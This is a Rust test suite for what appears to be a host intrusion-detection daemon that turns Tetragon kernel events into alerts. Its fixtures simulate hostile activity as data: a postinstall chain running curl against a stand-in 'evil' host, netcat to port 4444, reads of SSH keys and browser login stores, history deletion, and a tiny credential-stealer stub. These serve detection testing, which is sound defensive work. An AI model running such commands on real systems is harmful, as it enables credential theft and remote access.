    /// install under a *different* npm gives a second chain, not a bigger one.
    #[test]
    fn a_second_unrelated_install_is_a_second_chain() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        // The two installs replay milliseconds apart, so without this the
        // second one folds into the first by (rule, exe, file) and never
        // produces the alerts a second chain would be made of. The question
        // here is about trees, not about dedupe.
        d.cfg.thresholds.dedupe_secs = 0;
        let text = std::fs::read_to_string(&d.cfg.paths.tetragon_log).unwrap();
        for line in text.lines() {
            d.handle_line(line);
        }
        // Same events, every exec_id and pid moved into a second install.
        for line in text.lines() {
            d.handle_line(&line.replace("bWFyczoxMjM0", "bWFyczo5OTk5").replace("412", "512"));
        }
        let chains: std::collections::HashSet<String> = d
            .store
            .load()
            .into_iter()
            .filter_map(|a| a.chain.map(|c| c.id))
            .collect();
        assert_eq!(chains.len(), 2, "two installs are two stories, not one");
    }

    /// Alert ids are the timeline, so a burst inside one millisecond must still
    /// come back in the order it was emitted. `Ulid::new()` only orders by the
    /// embedded millisecond and tied on the random suffix, which made
    /// `store.load().next_back()` — and `moatctl list`'s "newest last" — a coin
    /// flip for same-millisecond alerts.
    #[test]
    fn alert_ids_are_monotonic_inside_one_millisecond() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let ids: Vec<String> = (0..500).map(|_| d.next_id()).collect();
        // Fast enough that the millisecond prefix repeats; if it never did the
        // test would pass for the wrong reason.
        let prefixes: std::collections::HashSet<&str> =
            ids.iter().map(|i| &i[..10]).collect();
        assert!(
            prefixes.len() < ids.len(),
            "no two ids shared a millisecond, so this proves nothing"
        );
        let mut sorted = ids.clone();
        sorted.sort();
        assert_eq!(ids, sorted, "ids must sort into the order they were issued");
    }

    /// The regression for the 2026-09-03 outage: Tetragon crash-looped for 25
    /// minutes while `status` said "running" and the shield stayed green,
    /// because both signals were a file's existence and a log's mtime — and a
    /// crash loop keeps both fresh. Health has to be counted from the kernel.
    #[test]
    fn sensor_health_is_counted_from_the_kernel_not_guessed() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let expected = d.policies.len();
        assert!(expected > 0, "fixture must ship policies");

        let pins = dir.path().join("bpf");
        std::fs::create_dir_all(&pins).unwrap();
        d.cfg.paths.tetragon_bpf_dir = pins.clone();

        // Nothing pinned: the sensor is down, however healthy systemd looks.
        assert_eq!(d.sensors_loaded(), Some(0));
        assert_eq!(d.tetragon_state(), "down");
        assert!(d.sensor_unhealthy());

        // Partway, with policies still arriving: attaching, not broken. This
        // is the 19-second window that made two decoy reads on 2026-09-10 look
        // like a detection that did not work.
        let names: Vec<String> = d.policies.names().into_iter().collect();
        std::fs::create_dir_all(pins.join(&names[0])).unwrap();
        assert_eq!(d.tetragon_state(), format!("loading 1/{}", expected));
        assert!(d.sensor_loading());
        assert!(
            d.sensor_unhealthy(),
            "still unhealthy -- coverage really is incomplete, only the advice differs"
        );
        std::fs::remove_dir_all(pins.join(&names[0])).unwrap();

        // Every policy pinned: running.
        for name in d.policies.names() {
            std::fs::create_dir_all(pins.join(&name)).unwrap();
        }
        // Tetragon's own sensors sit here too and must not be counted as ours.
        std::fs::create_dir_all(pins.join("__base__")).unwrap();
        assert_eq!(d.sensors_loaded(), Some(expected));
        assert_eq!(d.tetragon_state(), "running");
        assert!(!d.sensor_unhealthy());

        // One policy fails to attach — the exact E2BIG shape — and the count
        // names how many of how many, rather than rounding up to "running".
        //
        // The settle window goes to zero first: unpinning touches the directory
        // mtime exactly like pinning, so at this instant a failed attach and a
        // load in progress are the same observation and only time separates
        // them. Zero here asks the question this test is actually about.
        d.sensor_settle_secs = 0;
        std::fs::remove_dir_all(pins.join(d.policies.names()[0].clone())).unwrap();
        assert_eq!(
            d.tetragon_state(),
            format!("degraded {}/{}", expected - 1, expected)
        );
        assert!(d.sensor_unhealthy());

        // bpffs unreadable is not the same claim as "zero loaded". With the
        // socket there we genuinely cannot tell, so say "unverified" and do not
        // cry wolf; with nothing there at all the old signals still convict.
        d.cfg.paths.tetragon_bpf_dir = dir.path().join("does-not-exist");
        assert_eq!(d.sensors_loaded(), None);

        d.cfg.paths.tetragon_socket = dir.path().join("tetragon.sock");
        std::fs::write(&d.cfg.paths.tetragon_socket, b"").unwrap();
        assert_eq!(d.tetragon_state(), "unverified");
        assert!(!d.sensor_unhealthy(), "unverified is not evidence of an outage");

        std::fs::remove_file(&d.cfg.paths.tetragon_socket).unwrap();
        d.cfg.paths.tetragon_log = dir.path().join("no-such.log");
        assert_eq!(d.tetragon_state(), "stopped");
        assert!(d.sensor_unhealthy());
    }

    /// The daemon must not alert on its own reads. An incident snapshot reads
    /// /proc/<pid>/{environ,status,cmdline,fd} for the alerting process and
    /// every ancestor, so any file rule covering those paths turns one alert
    /// into an unbounded chain of them.
    #[test]
    fn moatd_never_alerts_on_its_own_reads() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let me = std::process::id();

        let line = |pid: u32| {
            format!(
                r#"{{"process_kprobe":{{"process":{{"exec_id":"e-{pid}","pid":{pid},"uid":0,"binary":"/usr/bin/moatd","arguments":"run","cwd":"/","start_time":"2026-09-03T16:21:00.000000000Z"}},"function_name":"security_file_post_open","policy_name":"moat-cred-ssh-private-key-read","args":[{{"file_arg":{{"path":"/home/dan/.ssh/id_ed25519_moat_fixture"}}}},{{"int_arg":4}}]}},"time":"2026-09-03T16:21:00.100Z"}}"#
            )
        };

        // Somebody else doing it is exactly what the rule is for.
        let other = if me == 4242 { 4243 } else { 4242 };
        let n = d.store.load().len();
        d.handle_line(&line(other));
        assert!(d.store.load().len() > n, "another process still alerts");

        // Us doing it is the loop, and must produce nothing at all.
        let n = d.store.load().len();
        d.handle_line(&line(me));
        assert_eq!(d.store.load().len(), n, "moatd must not alert on itself");
    }

    /// The feedback loop moat built for itself. Staging an incident copies the
    /// credential file into /var/lib/moat/incidents/<id>/file/<name>; the next
    /// recursive search reads that copy; the read raises a fresh cred alert;
    /// that alert stages another copy. Half of every browser-secret alert on
    /// this machine on 2026-09-04 was this loop eating its own tail.
    #[test]
    fn a_read_of_moats_own_evidence_store_is_never_a_credential_alert() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());
        let staged = cfg
            .paths
            .state_dir
            .join("incidents/01ABC/file/Login Data")
            .to_string_lossy()
            .into_owned();

        let read = |policy: &str, path: &str| {
            format!(
                r#"{{"process_kprobe":{{"process":{{"exec_id":"r1","pid":9400,"uid":1000,"binary":"/usr/bin/rg","arguments":"--hidden --glob !.git","cwd":"/home/testuser","start_time":"2026-09-04T23:15:00.000000000Z"}},"function_name":"security_file_post_open","policy_name":"{}","args":[{{"file_arg":{{"path":"{}"}}}},{{"int_arg":4}}]}},"time":"2026-09-04T23:15:43.100Z"}}"#,
                policy, path
            )
        };

        let n = d.store.load().len();
        d.handle_line(&read("moat-cred-browser-secrets-read", &staged));
        assert_eq!(
            d.store.load().len(),
            n,
            "reading moat's own staged evidence must never raise a cred alert"
        );

        // The real file it was copied FROM is still the whole point of the rule.
        d.handle_line(&read(
            "moat-cred-browser-secrets-read",
            "/home/testuser/.config/google-chrome/Default/Login Data",
        ));
        assert_eq!(d.store.load().len(), n + 1, "the rule still guards real browser secrets");

        // And a rule whose SUBJECT is that directory keeps seeing it, or the
        // cut above would have quietly disarmed the tamper detection.
        let unlink = format!(
            r#"{{"process_kprobe":{{"process":{{"exec_id":"r2","pid":9401,"uid":0,"binary":"/usr/bin/rm","arguments":"-rf","cwd":"/","start_time":"2026-09-04T23:16:00.000000000Z"}},"function_name":"security_path_unlink","policy_name":"moat-rootkit-evidence-tamper","args":[{{"path_arg":{{"path":"{}"}}}}]}},"time":"2026-09-04T23:16:00.100Z"}}"#,
            staged
        );
        d.handle_line(&unlink);
        assert_eq!(
            d.store.load().len(),
            n + 2,
            "evidence-tamper must still fire on moat's own directory"
        );
    }

    /// The kernel matches a history file by name alone (`Postfix
    /// /.bash_history`), so it fires on that name anywhere on the filesystem.
    /// On 2026-09-04 moat's own test suite tripped it -- `rm -rf` on a sandbox
    /// tempdir removed the throwaway $HOME inside it -- and because the rule is
    /// in the `rootkit` family that raised an ordinary build into a HIGH chain.
    #[test]
    fn a_history_file_that_is_nobodys_history_is_not_tampering() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.homes = vec!["/home/testuser".into()];
        d.provenance.set_homes(&d.homes);
        d.subvols = vec![("/@home".into(), "/home".into()), ("/@".into(), "/".into())];

        let ev = |path: &str| {
            format!(
                r#"{{"process_kprobe":{{"process":{{"exec_id":"h1","pid":9300,"uid":1000,"binary":"/usr/bin/rm","arguments":"-rf --","cwd":"/tmp","start_time":"2026-09-04T21:25:00.000000000Z"}},"function_name":"security_path_unlink","policy_name":"moat-rootkit-history-tamper","args":[{{"path_arg":{{"path":"{}"}}}}]}},"time":"2026-09-04T21:25:00.100Z"}}"#,
                path
            )
        };

        // The exact event from 2026-09-04. Nobody's trail, so none was covered.
        let n = d.store.load().len();
        d.handle_line(&ev("/moat-sandbox-test.VBeheQGq/home/.bash_history"));
        assert_eq!(
            d.store.load().len(),
            n,
            "a .bash_history inside a scratch dir is not anyone's history"
        );

        // The same `rm` against a real account still alerts -- and the
        // subvolume spelling the sensor actually emits must not hide it, which
        // is the way this fix could have quietly killed the rule instead.
        d.handle_line(&ev("/@home/testuser/.bash_history"));
        let alerts = d.store.load();
        assert_eq!(
            alerts.len(),
            n + 1,
            "erasing a real account's history is the entire point of the rule"
        );
        assert_eq!(
            alerts.last().unwrap().file.as_ref().unwrap().path,
            "/home/testuser/.bash_history",
            "the path shown is the one a person would recognise, not /@home/..."
        );
    }

    /// A finding at high severity captures an incident snapshot, and that
    /// snapshot sha256s the file the event named. So a fixture that names a
    /// real path makes the test suite *open that file* — and every fixture
    /// here is a credential path by construction. Naming the developer's own
    /// ~/.ssh/id_rsa meant `cargo test` read their private key on every run,
    /// and raised three real moat-cred-ssh-private-key-read alerts while doing
    /// it. Fixture paths must not exist.
    /// 2026-09-07: this scanned `engine.rs` and nothing else, and the fixture
    /// that actually drives the engine is not in `engine.rs` -- `replay()`
    /// reads `testdata/sample.log` off disk. That file named the developer's
    /// real `~/.ssh/id_ed25519`, so once such a key existed (created on this
    /// machine at 08:28, with the suite green at 08:12) `cargo test` read it
    /// and hashed it into an incident snapshot: the exact incident the comment
    /// above describes, recurring in the one place this test could not see.
    /// So the fixture DATA is scanned too, not only the code.
    #[test]
    fn no_test_fixture_names_a_path_that_exists_on_this_machine() {
        let mut src = include_str!("engine.rs").to_string();
        let testdata = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata");
        let mut fixtures = 0;
        if let Ok(rd) = std::fs::read_dir(&testdata) {
            for e in rd.flatten() {
                if let Ok(text) = std::fs::read_to_string(e.path()) {
                    // The scan below splits on '"', which JSON fixtures are
                    // full of -- exactly the shape it wants.
                    src.push('\n');
                    src.push_str(&text);
                    fixtures += 1;
                }
            }
        }
        assert!(fixtures > 0, "no fixture data was scanned; {:?} moved?", testdata);
        let src = src.as_str();
        let mut bad = Vec::new();
        for cap in src.split('"').filter(|s| s.starts_with("/home/") || s.starts_with("/root/")) {
            let path = cap.split_whitespace().next().unwrap_or(cap);
            // Directories are fine and expected: tests name $HOME and a cwd.
            // A regular *file* is the hazard, because that is what gets opened.
            if std::path::Path::new(path).is_file() {
                bad.push(path.to_string());
            }
        }
        bad.sort();
        bad.dedup();
        assert!(
            bad.is_empty(),
            "fixtures name real paths on this machine, so the suite reads them: {:?}",
            bad
        );
    }

    /// End to end: a cred alert's bundle stages the suspect so the agent can
    /// actually deobfuscate it, and names the credential as withheld.
    ///
    /// The fixture policy requires the literal prefix `/home/dan/.ssh/id_`, so
    /// the target path is a name under it that does not exist — this test will
    /// not read a real private key to prove a point about not reading private
    /// keys. That the *bytes* of a real secret never leave is proved with real
    /// files in `evidence::tests::staging_copies_the_actor_and_withholds_the_secret`.
    #[test]
    fn a_bundle_stages_the_suspect_and_withholds_the_credential() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());

        let suspect = dir.path().join("stealer.mjs");
        std::fs::write(&suspect, b"const p=atob('c3RlYWw=');require('fs').readFileSync(p)").unwrap();
        let victim = "/home/dan/.ssh/id_rsa_moat_fixture";

        d.handle_line(&format!(
            r#"{{"process_lsm":{{"process":{{"exec_id":"b-1","pid":5150,"uid":1000,"binary":"{}","cwd":"/tmp","start_time":"2026-09-03T16:21:00.000000000Z"}},"function_name":"file_post_open","policy_name":"moat-cred-ssh-private-key-read","args":[{{"file_arg":{{"path":"{}"}}}},{{"int_arg":4}}]}},"time":"2026-09-03T16:21:00.100Z"}}"#,
            suspect.display(),
            victim
        ));
        let id = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-cred-ssh-private-key-read")
            .expect("the alert")
            .id;

        let path = d.write_bundle(&id).expect("bundle");
        let md = std::fs::read_to_string(&path).unwrap();

        // The suspect is staged and named, so the agent can read and decode it.
        assert!(md.contains("## Files"), "{}", md);
        assert!(md.contains("actor.stealer.mjs.suspect"), "{}", md);
        let staged = path.parent().unwrap().join("actor.stealer.mjs.suspect");
        assert!(staged.exists(), "the suspect script sits beside the bundle");
        assert!(String::from_utf8_lossy(&std::fs::read(&staged).unwrap()).contains("atob"));
        use std::os::unix::fs::PermissionsExt;
        let mode = std::fs::metadata(&staged).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode, 0o440, "staged hostile files are read-only");
        assert_eq!(mode & 0o111, 0, "and never executable");
        // The comment above says "so the agent can read and decode it", and the
        // agent runs as the user while moatd runs as root -- so group-readable
        // is not a detail, it is the difference between staging working and
        // being an elaborate no-op.
        assert_ne!(mode & 0o040, 0, "the group the agent is in must be able to open it");

        // The credential is named and explicitly withheld, and the agent is
        // told not to go and open it itself.
        assert!(md.contains("contents withheld"), "{}", md);
        assert!(md.contains(victim), "the path is still disclosed: {}", md);
        assert!(
            md.contains("do not try to read the original path"),
            "{}",
            md
        );
    }

    fn replay(d: &mut Daemon) {
        let text = std::fs::read_to_string(&d.cfg.paths.tetragon_log).unwrap();
        for line in text.lines() {
            d.handle_line(line);
        }
    }

    #[test]
    fn the_sample_log_produces_explainable_alerts() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.homes = vec!["/home/dan".into()];
        replay(&mut d);

        let alerts = d.store.load();
        let rules: Vec<&str> = alerts.iter().map(|a| a.rule.as_str()).collect();
        assert!(rules.contains(&"moat-cred-ssh-private-key-read"));
        assert!(rules.contains(&"moat-shell-reverse-shell-connect"));
        assert!(rules.contains(&"moat-x-ai-cli-headless"));

        for a in &alerts {
            assert!(!a.explain.what.is_empty(), "{} has no what", a.rule);
            assert!(!a.explain.why.is_empty(), "{} has no why", a.rule);
            assert!(a.explain.evidence.len() >= 3, "{} has thin evidence", a.rule);
            assert!(!a.explain.next.is_empty());
            assert!(!a.explain.if_expected.options.is_empty());
            assert_eq!(a.v, 1);
            assert!(!a.id.is_empty());
        }
    }

    #[test]
    fn ancestry_reaches_the_package_manager() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        replay(&mut d);
        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-cred-ssh-private-key-read")
            .unwrap();
        let exes: Vec<String> = a.process.ancestry.iter().map(|x| x.exe.clone()).collect();
        assert!(exes.iter().any(|e| e.ends_with("/npm")), "{:?}", exes);
        assert!(a.summary.contains("Parent chain: fish -> npm -> sh -> node"));
    }

    #[test]
    fn a_kill_is_only_recorded_after_the_exit_signal() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        replay(&mut d);
        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-shell-reverse-shell-connect")
            .unwrap();
        // The event carried KPROBE_ACTION_SIGKILL and the sample log has the
        // matching SIGKILL exit, so this one is confirmed.
        assert_eq!(a.action_taken, "killed");
        assert!(a
            .explain
            .evidence
            .iter()
            .any(|e| e.contains("only recorded once process_exit reports SIGKILL")));

        // Without the exit line it must stay "none".
        let dir2 = tempfile::tempdir().unwrap();
        let (mut d2, _) = dev_daemon(dir2.path());
        let text = std::fs::read_to_string(&d2.cfg.paths.tetragon_log).unwrap();
        for line in text.lines().filter(|l| !l.contains("process_exit")) {
            d2.handle_line(line);
        }
        let a2 = d2
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-shell-reverse-shell-connect")
            .unwrap();
        assert_eq!(a2.action_taken, "none");
    }

    /// BASELINE §8: a suppressed alert is recorded, greyed out and uncounted —
    /// it is not dropped. A suppression the user cannot see is exactly the kind
    /// of silence this project promises not to produce.
    #[test]
    fn the_allowlist_records_a_suppressed_alert_instead_of_dropping_it() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());
        std::fs::write(
            cfg.paths.allowlist_dir.join("user.toml"),
            "# expected: our own node\n[[rule]]\nname = \"moat-cred-ssh-private-key-read\"\nexe = \"*/bin/node\"\n",
        )
        .unwrap();
        d.reload_allowlist();
        replay(&mut d);

        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-cred-ssh-private-key-read")
            .expect("still on the timeline");
        assert_eq!(a.suppressed_by.as_deref(), Some("user.toml#1"));
        assert!(a
            .explain
            .evidence
            .iter()
            .any(|e| e.contains("suppressed by allowlist entry user.toml#1")));
        // Out of the badge, and counted separately from real alerts.
        let counted = d
            .store
            .load()
            .iter()
            .filter(|x| !x.acked && !x.is_suppressed() && x.surface == "alerts" && x.severity == a.severity)
            .count() as u64;
        assert_eq!(d.store.unacked()[&a.severity], counted, "suppressed alerts are not counted");
        assert!(d.alerts_suppressed >= 1);
    }

    #[test]
    fn repeats_inside_the_window_fold_into_a_count() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let line = std::fs::read_to_string(&d.cfg.paths.tetragon_log)
            .unwrap()
            .lines()
            .find(|l| l.contains("moat-cred-ssh-private-key-read"))
            .unwrap()
            .to_string();
        for _ in 0..5 {
            d.handle_line(&line);
        }
        let alerts: Vec<Alert> = d
            .store
            .load()
            .into_iter()
            .filter(|a| a.rule == "moat-cred-ssh-private-key-read")
            .collect();
        assert_eq!(alerts.len(), 1, "one alert, not five");
        assert_eq!(alerts[0].count, Some(5));
    }

    #[test]
    fn a_non_moat_policy_is_enrichment_only() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let line = r#"{"process_kprobe":{"process":{"exec_id":"zz","pid":1,"uid":0,"binary":"/usr/bin/x"},"function_name":"security_file_permission","policy_name":"some-other-policy","args":[{"file_arg":{"path":"/etc/shadow"}}]},"time":"2026-09-03T16:00:00Z"}"#;
        d.handle_line(line);
        assert!(d.store.load().is_empty());
        assert!(d.table.get("zz").is_some(), "still used for enrichment");
    }

    /// The event that started the re-validation work: the SSH-key policy's name
    /// on a sysfs path its own `Prefix` selector cannot produce.
    #[test]
    fn a_kernel_match_its_own_selector_rejects_becomes_a_sensor_mismatch() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let line = r#"{"process_lsm":{"process":{"exec_id":"zz1","pid":4242,"uid":1000,"binary":"/usr/bin/node","arguments":"server.js","cwd":"/home/dan","start_time":"2026-09-03T16:21:06.900000000Z"},"function_name":"file_post_open","policy_name":"moat-cred-ssh-private-key-read","args":[{"file_arg":{"path":"/sys/devices/system/cpu/online"}},{"int_arg":4}]},"time":"2026-09-03T16:21:07.000Z"}"#;
        d.handle_line(line);

        let alerts = d.store.load();
        assert_eq!(alerts.len(), 1);
        let a = &alerts[0];
        assert_eq!(a.rule, "moat-x-sensor-mismatch");
        assert_eq!(a.severity, "low");
        assert_eq!(a.file.as_ref().unwrap().path, "/sys/devices/system/cpu/online");
        let ev = a.explain.evidence.join("\n");
        assert!(ev.contains("policy: moat-cred-ssh-private-key-read"), "{}", ev);
        assert!(ev.contains("/sys/devices/system/cpu/online"), "{}", ev);
        assert!(ev.contains("matchArgs index 0"), "{}", ev);
        assert!(a.explain.why.contains("should have rejected"));
        assert!(
            !alerts.iter().any(|x| x.rule == "moat-cred-ssh-private-key-read"),
            "the policy alert itself must NOT be raised"
        );
    }

    #[test]
    fn a_path_the_policy_does_name_still_alerts_normally() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let line = r#"{"process_lsm":{"process":{"exec_id":"zz2","pid":4243,"uid":1000,"binary":"/usr/bin/node","arguments":"x.js","cwd":"/home/dan","start_time":"2026-09-03T16:21:06.900000000Z"},"function_name":"file_post_open","policy_name":"moat-cred-ssh-private-key-read","args":[{"file_arg":{"path":"/home/dan/.ssh/id_ed25519_moat_fixture"}},{"int_arg":4}]},"time":"2026-09-03T16:21:07.000Z"}"#;
        d.handle_line(line);
        let rules: Vec<String> = d.store.load().into_iter().map(|a| a.rule).collect();
        assert_eq!(rules, vec!["moat-cred-ssh-private-key-read"]);
    }

    /// `moat-net-suspicious-port-egress` fires for every process at medium;
    /// being inside an install is what makes it high.
    #[test]
    fn suspicious_port_egress_is_escalated_inside_a_package_subtree() {
        fn egress_line(exec_id: &str, pid: u32) -> String {
            format!(
                r#"{{"process_kprobe":{{"process":{{"exec_id":"{}","pid":{},"uid":1000,"binary":"/usr/bin/node","arguments":"install.js","cwd":"/home/dan/proj","start_time":"2026-09-03T16:21:06.900000000Z"}},"function_name":"tcp_connect","policy_name":"{}","args":[{{"sock_arg":{{"family":"AF_INET","daddr":"185.220.101.55","dport":4444,"saddr":"192.168.1.20","sport":51234}}}}]}},"time":"2026-09-03T16:21:07.000Z"}}"#,
                exec_id, pid, SUSPICIOUS_PORT_EGRESS
            )
        }

        // Outside an install: whatever the policy annotations say, unchanged.
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.handle_line(&egress_line("out1", 5000));
        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == SUSPICIOUS_PORT_EGRESS)
            .expect("the policy alert is raised for every process");
        // The rule says medium; `/usr/bin/node` is official in the fixture, and
        // `net` is one of the families BASELINE §2 lets provenance soften.
        assert_eq!(a.severity_base, "medium");
        assert_eq!(a.severity, "low");
        assert!(a.severity_reason.contains("actor is official"), "{}", a.severity_reason);
        assert!(!a.explain.evidence.iter().any(|e| e.contains("raised from")));

        // Inside an npm install: high, with the root named.
        let dir2 = tempfile::tempdir().unwrap();
        let (mut d2, _) = dev_daemon(dir2.path());
        d2.handle_line(r#"{"process_exec":{"process":{"exec_id":"e-npm","pid":41201,"uid":1000,"binary":"/usr/bin/npm","arguments":"install","cwd":"/home/dan/proj","start_time":"2026-09-03T16:21:01.000000000Z"}}}"#);
        d2.handle_line(r#"{"process_exec":{"process":{"exec_id":"in1","pid":5001,"uid":1000,"binary":"/usr/bin/node","arguments":"install.js","cwd":"/home/dan/proj","start_time":"2026-09-03T16:21:06.900000000Z","parent_exec_id":"e-npm"}}}"#);
        d2.handle_line(&egress_line("in1", 5001));
        let a = d2
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == SUSPICIOUS_PORT_EGRESS)
            .unwrap();
        // And a package install is never downgraded, however official the actor.
        assert_eq!(a.severity, "high");
        assert_eq!(a.context, crate::context::Context::PkgInstall);
        let ev = a.explain.evidence.join("\n");
        assert!(ev.contains("package-manager subtree root: /usr/bin/npm"), "{}", ev);
        assert!(ev.contains("raised from medium to high"), "{}", ev);
    }

    /// The four rules that replaced the deleted kernel policies work off
    /// `process_exec` alone, so they need no policy to be loaded at all.
    #[test]
    fn the_pkg_subtree_rules_fire_from_exec_events_only() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        for (id, pid, exe, args, parent) in [
            ("x-fish", 41101, "/usr/bin/fish", "", ""),
            ("x-npm", 41201, "/usr/bin/npm", "install", "x-fish"),
            ("x-sh", 41240, "/usr/bin/sh", "-c postinstall", "x-npm"),
            ("x-curl", 41241, "/usr/bin/curl", "-sL https://evil/x", "x-sh"),
            ("x-nc", 41242, "/usr/bin/nc", "1.2.3.4 4444", "x-sh"),
            ("x-cli", 41243, "/usr/bin/claude", "-p fix", "x-sh"),
        ] {
            d.handle_line(&format!(
                r#"{{"process_exec":{{"process":{{"exec_id":"{}","pid":{},"uid":1000,"binary":"{}","arguments":"{}","cwd":"/home/dan/proj","start_time":"2026-09-03T16:21:06.900000000Z"{}}}}}}}"#,
                id,
                pid,
                exe,
                args,
                if parent.is_empty() {
                    String::new()
                } else {
                    format!(r#","parent_exec_id":"{}""#, parent)
                }
            ));
        }
        let mut rules: Vec<String> = d.store.load().into_iter().map(|a| a.rule).collect();
        rules.sort();
        assert_eq!(
            rules,
            vec![
                "moat-ai-cli-in-pkg-subtree",
                "moat-pkg-subtree-downloader",
                "moat-pkg-subtree-interpreter-spawn",
                "moat-pkg-subtree-netcat-exec",
                // The shell above the agent is npm's, not a person's, so the
                // headless rule speaks up as well. Two rules, two angles.
                "moat-x-ai-cli-headless",
            ]
        );
        // Monitor mode never kills, whatever the rule asked for.
        assert!(d.store.load().iter().all(|a| a.action_taken == "none"));
    }

    /// Spawn a freshly copied binary, retrying `ETXTBSY`.
    ///
    /// `fs::copy` in one test thread and `fork+exec` in another race: the child
    /// inherits the still-open write descriptor and the kernel refuses the
    /// exec. Nothing to do with the daemon, everything to do with running the
    /// suite in parallel.
    fn spawn_retrying_etxtbsy(path: &Path) -> std::process::Child {
        for _ in 0..50 {
            match std::process::Command::new(path).arg("30").spawn() {
                Ok(c) => return c,
                Err(e) if e.raw_os_error() == Some(libc::ETXTBSY) => {
                    std::thread::sleep(Duration::from_millis(20));
                }
                Err(e) => panic!("spawn {}: {}", path.display(), e),
            }
        }
        panic!("{} stayed busy", path.display())
    }

    /// Spawn the victim **and prove /proc still names it**, returning the
    /// process, its pid, its start time in Tetragon's format and its exe.
    ///
    /// The proof matters: this test process runs dozens of threads, pids are
    /// recycled, and a child that lost the race would otherwise be described to
    /// the daemon under some other program's name — which is a broken test, not
    /// a broken rule.
    fn spawn_victim(path: &Path) -> (std::process::Child, u32, String, String) {
        for _ in 0..20 {
            let child = spawn_retrying_etxtbsy(path);
            let pid = child.id();
            let exe = util::proc_exe(pid);
            let start = util::proc_start_nanos(pid);
            match (exe, start) {
                (Some(exe), Some(start)) if Path::new(&exe) == path => {
                    let ts = chrono::DateTime::from_timestamp(
                        (start / 1_000_000_000) as i64,
                        (start % 1_000_000_000) as u32,
                    )
                    .expect("a start time inside the epoch")
                    .format("%Y-%m-%dT%H:%M:%S%.9fZ")
                    .to_string();
                    return (child, pid, ts, exe);
                }
                _ => {
                    let mut child = child;
                    let _ = child.kill();
                    let _ = child.wait();
                }
            }
        }
        panic!("{} never stayed alive long enough to be observed", path.display())
    }

    /// Enforce mode kills the netcat itself — verified against a real process,
    /// because "we verified the start time" is the whole point.
    #[test]
    fn enforce_mode_kills_a_netcat_and_records_it() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.mode = "enforce".into();

        // A real process whose basename the rule matches: `sleep`, copied to
        // `<tmp>/nc`. Nothing here is faked — /proc is the witness.
        let Some(src) = ["/usr/bin/sleep", "/bin/sleep"]
            .iter()
            .map(Path::new)
            .find(|p| p.exists())
        else {
            return;
        };
        let victim = dir.path().join("nc");
        std::fs::copy(src, &victim).unwrap();
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&victim, std::fs::Permissions::from_mode(0o755)).unwrap();
        }

        let (mut child, pid, ts, exe) = spawn_victim(&victim);

        d.handle_line(r#"{"process_exec":{"process":{"exec_id":"k-npm","pid":41201,"uid":1000,"binary":"/usr/bin/npm","arguments":"install","start_time":"2026-09-03T16:21:01.000000000Z"}}}"#);
        d.handle_line(&format!(
            r#"{{"process_exec":{{"process":{{"exec_id":"k-nc","pid":{},"uid":1000,"binary":"{}","arguments":"1.2.3.4 4444","start_time":"{}","parent_exec_id":"k-npm"}}}}}}"#,
            pid, exe, ts
        ));

        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-pkg-subtree-netcat-exec")
            .expect("nc inside an npm install is critical");
        assert_eq!(a.severity, "critical");
        assert_eq!(a.action_taken, "killed");
        assert!(a.explain.evidence.iter().any(|e| e.contains("sent SIGKILL")), "{:?}", a.explain.evidence);

        use std::os::unix::process::ExitStatusExt;
        let status = child.wait().unwrap();
        assert_eq!(status.signal(), Some(libc::SIGKILL), "the process was actually killed");

        // Same event in monitor mode: nothing dies.
        let dir2 = tempfile::tempdir().unwrap();
        let (mut d2, _) = dev_daemon(dir2.path());
        let victim2 = dir2.path().join("nc");
        std::fs::copy(src, &victim2).unwrap();
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&victim2, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        let (mut child2, pid2, ts2, exe2) = spawn_victim(&victim2);
        d2.handle_line(r#"{"process_exec":{"process":{"exec_id":"k-npm","pid":41201,"uid":1000,"binary":"/usr/bin/npm","arguments":"install","start_time":"2026-09-03T16:21:01.000000000Z"}}}"#);
        d2.handle_line(&format!(
            r#"{{"process_exec":{{"process":{{"exec_id":"k-nc","pid":{},"uid":1000,"binary":"{}","arguments":"1.2.3.4 4444","start_time":"{}","parent_exec_id":"k-npm"}}}}}}"#,
            pid2, exe2, ts2
        ));
        let a2 = d2
            .store
            .load()
            .into_iter()
